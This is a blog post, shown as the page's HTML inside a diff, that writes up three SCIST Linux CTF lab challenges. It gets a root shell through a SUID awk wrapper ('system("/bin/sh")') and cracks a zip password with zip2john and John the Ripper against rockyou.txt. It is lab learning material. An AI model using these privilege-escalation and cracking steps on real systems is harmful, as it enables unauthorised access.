@@ -1,0 +1,420 @@
+
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+  <script>
+    (function() {
+      try {
+        // 1. 优先从 localStorage 获取用户保存的主题
+        var savedTheme = localStorage.getItem('theme');
+        
+        // 2. 如果没有保存的主题，则检查系统偏好
+        var theme = savedTheme || (window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light');
+        
+        // 3. 将主题属性应用到 <html> 元素上
+        //    在 <head> 中执行时，<body> 可能还不存在，所以操作 <html> 更安全
+        if (theme === 'dark') {
+          document.documentElement.setAttribute('data-theme', 'dark');
+        }
+      } catch (e) {
+        // 如果发生错误，则不执行任何操作，让主脚本来处理
+      }
+    })();
+  </script>
+  
+  <!-- 提示浏览器颜色的 meta 标签 -->
+  <meta name="color-scheme" content="light dark">
+  <!-- Mastodon 验证 -->
+  <meta name="fediverse:creator" content="@illlights@anisaga.life">
+  
+
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SCIST Linux CTF - Writeup [ Record of my Journey ]</title>
+
+  <link rel="icon" href="/img/favicon.ico">
+
+
+    <meta name="author" content="LDN97">
+
+
+    <meta name="subtitle" content="LDN's Blog">
+
+
+    <meta name="Description" content="分享程式，日常，遊戲評論等各種主題的部落格">
+
+
+    <meta name="keywords" content=",程式, 技術, 遊戲, 日常">
+
+
+  <link rel="alternate" href="/atom.xml " title="Record of my Journey" type="application/atom+xml">
+
+
+  
+    <link rel="stylesheet" href="/css/main.css">
+  
+
+
+<!-- 隨機背景圖片 -->
+<script src="/js/random-bg.js"></script>
+<meta name="generator" content="Hexo 8.1.1"></head>
+<body class="notransition">
+  <!-- <script defer>
+    // 延迟移除 notransition 类，确保初始主题设置完成
+    setTimeout(() => document.body.classList.remove("notransition"), 75);
+  </script> -->
+  <div class="navbar" role="navigation">
+    <nav class="menu">
+      <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+      <label for="menu-trigger">
+        <span class="menu-icon">
+          <svg
+            xmlns="http://www.w3.org/2000/svg"
+            width="24"
+            height="24"
+            viewBox="0 0 512 512"
+          >
+            <path
+              d="M64,384H448V341.33H64Zm0-106.67H448V234.67H64ZM64,128v42.67H448V128Z"
+            />
+          </svg>
+        </span>
+      </label>
+      <a id="mode">
+        <svg
+          class="mode-sunny"
+          xmlns="http://www.w3.org/2000/svg"
+          width="24"
+          height="24"
+          viewBox="0 0 512 512"
+        >
+          <title>LIGHT</title>
+          <line
+            x1="256"
+            y1="48"
+            x2="256"
+            y2="96"
+            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
+          />
+          <line
+            x1="256"
+            y1="416"
+            x2="256"
+            y2="464"
+            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
+          />
+          <line
+            x1="403.08"
+            y1="108.92"
+            x2="369.14"
+            y2="142.86"
+            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
+          />
+          <line
+            x1="142.86"
+            y1="369.14"
+            x2="108.92"
+            y2="403.08"
+            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
+          />
+          <line
+            x1="464"
+            y1="256"
+            x2="416"
+            y2="256"
+            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
+          />
+          <line
+            x1="96"
+            y1="256"
+            x2="48"
+            y2="256"
+            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
+          />
+          <line
+            x1="403.08"
+            y1="403.08"
+            x2="369.14"
+            y2="369.14"
+            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
+          />
+          <line
+            x1="142.86"
+            y1="142.86"
+            x2="108.92"
+            y2="108.92"
+            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
+          />
+          <circle
+            cx="256"
+            cy="256"
+            r="80"
+            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
+          />
+        </svg>
+        <svg
+          class="mode-moon"
+          xmlns="http://www.w3.org/2000/svg"
+          width="24"
+          height="24"
+          viewBox="0 0 512 512"
+        >
+          <title>DARK</title>
+          <line
+            x1="256"
+            y1="48"
+            x2="256"
+            y2="96"
+            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
+          />
+          <line
+            x1="256"
+            y1="416"
+            x2="256"
+            y2="464"
+            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
+          />
+          <line
+            x1="403.08"
+            y1="108.92"
+            x2="369.14"
+            y2="142.86"
+            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
+          />
+          <line
+            x1="142.86"
+            y1="369.14"
+            x2="108.92"
+            y2="403.08"
+            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
+          />
+          <line
+            x1="464"
+            y1="256"
+            x2="416"
+            y2="256"
+            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
+          />
+          <line
+            x1="96"
+            y1="256"
+            x2="48"
+            y2="256"
+            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
+          />
+          <line
+            x1="403.08"
+            y1="403.08"
+            x2="369.14"
+            y2="369.14"
+            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
+          />
+          <line
+            x1="142.86"
+            y1="142.86"
+            x2="108.92"
+            y2="108.92"
+            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
+          />
+          <circle
+            cx="256"
+            cy="256"
+            r="80"
+            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
+          />
+        </svg>
+      </a>
+      <div class="trigger">
+        <div class="trigger-container">
+          
+            
+            
+            
+            
+            
+            
+            <a class="menu-link " href="/"> 主頁</a>
+          
+            
+            
+            
+            
+            
+            
+            <a class="menu-link " href="/categories/"> 分類</a>
+          
+            
+            
+            
+            
+            
+            
+            <a class="menu-link " href="/moments/"> 動態</a>
+          
+            
+            
+            
+            
+            
+            
+            <a class="menu-link " href="/archives/"> 文章</a>
+          
+            
+            
+            
+            
+            
+            
+            <a class="menu-link " href="/friends/"> 友鏈</a>
+          
+            
+            
+            
+            
+            
+            
+            <a class="menu-link " href="/about/"> 關於</a>
+          
+        </div>
+      </div>
+    </nav>
+  </div>
+  <button id="toTopBtn"><i class="fa-solid fa-hand-point-up " ></i></button>
+<button id="toggleButton"><i class="fa-solid fa-chart-bar " ></i></button>
+<div id="overlay" class="overlay glass-wrapper overlay-bg">
+  <div class="content">
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#scist-linux-ctf-writeup"><span class="toc-text"> SCIST Linux CTF - Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#linux"><span class="toc-text"> Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hw0-use-rev-command-to-read-the-flag"><span class="toc-text"> HW0 - Use rev command to read the &#x2F;flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hw1-suid-privilege-escalation"><span class="toc-text"> HW1 - SUID privilege escalation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hw2-zip-%E5%AF%86%E7%A2%BC%E7%A0%B4%E8%A7%A3"><span class="toc-text"> HW2 - zip 密碼破解</span></a></li></ol></li></ol></li></ol>
+    <button id="closeButton"><i class="fa-solid fa-circle-xmark"></i></button>
+  </div>
+</div>
+<div class="wrapper post">
+  <head>
+    <!-- 引入 Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  </head>
+
+
+
+  <main class="page-content" aria-label="Content">
+    <div class="glass-wrapper main-content">
+      <header class="header">
+        
+          <div class="tags">
+            <a href="/tags/%E7%AD%86%E8%A8%98/" class="tag"># 筆記</a><a href="/tags/%E8%B3%87%E5%AE%89/" class="tag"># 資安</a>
+          </div>
+        
+          <h1 class="header-title" itemprop="headline">SCIST Linux CTF - Writeup</h1>
+          <div class="post-meta">
+            最後更新: <time>11月 05, 2025</time>
+            作者: <span itemprop="author">
+              <span itemprop="name">LDN97</span>
+            </span>
+            字數: <span class="post-count">568</span>
+            預計閱讀時間: <span class="post-count">2min</span> 
+          </div>       
+      </header>
+          <div class="page-content"><h1 id="scist-linux-ctf-writeup"><a class="markdownIt-Anchor" href="#scist-linux-ctf-writeup"></a> SCIST Linux CTF - Writeup</h1>
+<h2 id="linux"><a class="markdownIt-Anchor" href="#linux"></a> Linux</h2>
+<h3 id="hw0-use-rev-command-to-read-the-flag"><a class="markdownIt-Anchor" href="#hw0-use-rev-command-to-read-the-flag"></a> HW0 - Use rev command to read the /flag</h3>
+<p>題目要求使用 rev 讀取靶機下的檔案，使用兩次 rev 獲得正確的 flag。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(ldn970110㉿LDNsKali)-[~]</span><br><span class="line">└─$ nc 靶機</span><br><span class="line">=== Rev-Only Challenge ===</span><br><span class="line">Flag is <span class="keyword">in</span> /flag. Find a way to <span class="built_in">read</span> it.</span><br><span class="line">root@7d99e433d724:/$ rev /flag</span><br><span class="line">&#125;trats_egassem_siht_ver&#123;TSICS</span><br><span class="line">root@7d99e433d724:/$ rev /flag | rev</span><br><span class="line">SCIST&#123;rev_this_message_start&#125;</span><br><span class="line">root@7d99e433d724:/$ </span><br></pre></td></tr></table></figure>
+<p><strong>Flag:</strong> <code>SCIST{rev_this_message_start}</code></p>
+<hr />
+<h3 id="hw1-suid-privilege-escalation"><a class="markdownIt-Anchor" href="#hw1-suid-privilege-escalation"></a> HW1 - SUID privilege escalation</h3>
+<p>連線靶機，獲得了一個低權限的 ctfuser shell：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfuser@80f752e94032:~$</span><br></pre></td></tr></table></figure>
+<p>尋找系統上具有 SUID 權限的檔案：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ctfuser@80f752e94032:~$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">... (其他標準 SUID 檔案)</span><br><span class="line">/usr/bin/awkrunner</span><br></pre></td></tr></table></figure>
+<p>跳出了一個提示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Usage: /usr/bin/awkrunner [AWK_PROGRAM] [FILES...]</span><br><span class="line">Note:  Executes /usr/bin/awk with full root privileges.</span><br></pre></td></tr></table></figure>
+<p>發現這個 awkrunner 會以 root 執行我所提供的腳本：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/awkrunner <span class="string">&#x27;BEGIN &#123; system(&quot;/bin/sh&quot;) &#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>執行後進入了一個具有 root 權限的 shell，透過這個 shell 執行 <code>/flag</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SCIST&#123;awk_1s_my_pr3f3rr3d_w4y_t0_r00t&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>Flag:</strong> <code>SCIST{awk_1s_my_pr3f3rr3d_w4y_t0_r00t}</code></p>
+<hr />
+<h3 id="hw2-zip-密碼破解"><a class="markdownIt-Anchor" href="#hw2-zip-密碼破解"></a> HW2 - zip 密碼破解</h3>
+<p>題目提供一個加密的 SCIST.zip 檔案，提示密碼存在於 rockyou.txt 字典檔中。Flag 藏在解壓縮後的 PDF 檔案的「作者 (Author)」欄位，並使用 Base64 加密。</p>
+<p>使用 John the Ripper 來破解密碼：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(ldn970110㉿LDNsKali)-[~/文件]</span><br><span class="line">└─$ zip2john /home/ldn970110/文件/SCIST.zip &gt; /home/ldn970110/文件/scist.hash</span><br></pre></td></tr></table></figure>
+<p>接著使用 john 搭配 rockyou.txt 字典檔來破解這個 hash：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(ldn970110㉿LDNsKali)-[~/文件]</span><br><span class="line">└─$ john --wordlist=/usr/share/wordlists/rockyou.txt /home/ldn970110/文件/scist.hash</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])</span><br><span class="line">No password hashes left to crack (see FAQ)</span><br><span class="line">┌──(ldn970110㉿LDNsKali)-[~/文件]</span><br><span class="line">└─$ john --wordlist=/usr/share/wordlists/rockyou.txt /home/ldn970110/文件/scist.hash</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])</span><br><span class="line">Cost 1 (HMAC size) is 114987 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 16 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">0g 0:00:00:05 4.17% (ETA: 16:12:22) 0g/s 125068p/s 125068c/s 125068C/s grass9..blah2007</span><br><span class="line">... (破解中) ...</span><br><span class="line">0g 0:00:00:13 10.48% (ETA: 16:12:27) 0g/s 124215p/s 124215c/s 124215C/s karenkim..jhvguyh</span><br><span class="line">fascist        (SCIST.zip/SCIST.pdf)     </span><br><span class="line">1g 0:00:00:14 DONE (2025-10-28 16:10) 0.06747g/s 123819p/s 123819c/s 123819C/s fish2133..efer05</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed.</span><br></pre></td></tr></table></figure>
+<p>John 成功找到了密碼：<strong>fascist</strong></p>
+<p>使用密碼解壓或的一個PDF，在作者欄位發現一串亂碼，透過base64解碼得到falg</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(ldn970110㉿LDNsKali)-[~/文件]</span><br><span class="line">└─$ <span class="built_in">echo</span> -n <span class="string">&quot;U0NJU1R7ejFwX2NyNGNrM2RfbTN0YV9sM2FrfQ==&quot;</span> | <span class="built_in">base64</span> -d</span><br><span class="line">SCIST&#123;z1p_cr4ck3d_m3ta_l3ak&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>Flag:</strong> <code>SCIST{z1p_cr4ck3d_m3ta_l3ak}</code></p>
+</div>          
+          <nav class="post-nav">
+    
+    <a class="post-nav-item post-nav-prev" href="/2025/11/04/live-reset-machine/">
+      <div class="nav-arrow">&lt;&nbsp;NEWER</div>
+      <span class="post-title">人生重來機</span>
+    </a>
+    
+    
+    <a class="post-nav-item post-nav-next" href="/2025/10/25/scist-s6-1/">
+      <div class="nav-arrow">OLDER&nbsp;&gt;</div>
+      <span class="post-title">scist s6 資安筆記</span>
+    </a>
+    
+  </nav>
+          <div class="dis">
+    
+        
+            
+<div id="tcomment" class="twikoo-container"></div>
+<script src="https://cdn.staticfile.org/twikoo/1.6.44/twikoo.all.min.js"></script> 
+<script>
+  twikoo.init({
+    envId: 'https://ldns-blog-comment.vercel.app/', // 從主題設定讀取 envId
+    el: '#tcomment',
+    // region: 'ap-guangzhou', // 如果您的 Vercel 部署區域不在預設區域，可能需要指定
+    // path: location.pathname, // 通常不需要手動設定，Twikoo 會自動抓取
+    // lang: 'zh-CN', // 可選：設定語言
+  });
+</script> 
+        
+        
+    
+</div>
+    </div>
+   </main>
+</div>
+
+  <footer class="footer">
+    <small class="footer_copyright">
+      <div id="bottom-inner">
+        © Site by LDN97<br>
+        <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a> &
+        <a target="_blank" rel="noopener" href="https://github.com/RichardTang2003/hexo-theme-Klise-glassy">Klise-glassy</a>
+        <br>
+        始於2025.
+        
+      </div>
+    </small>
+  </footer>
+  
+  
+
+    
+      <script src="/js/main.js"></script>
+    
+  
+  <script>
+    window.FPConfig = {
+      delay: 0,
+      ignoreKeywords: [],
+      maxRPS: 3,
+      hoverDelay: 50,
+    };
+  </script>
+  <!-- <script defer src="https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"></script> -->
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      // 当 DOM 内容加载完成后，为 body 添加 'loaded' 类
+      document.body.classList.add('loaded');
+    });
+  </script>
+</body>
+</html>
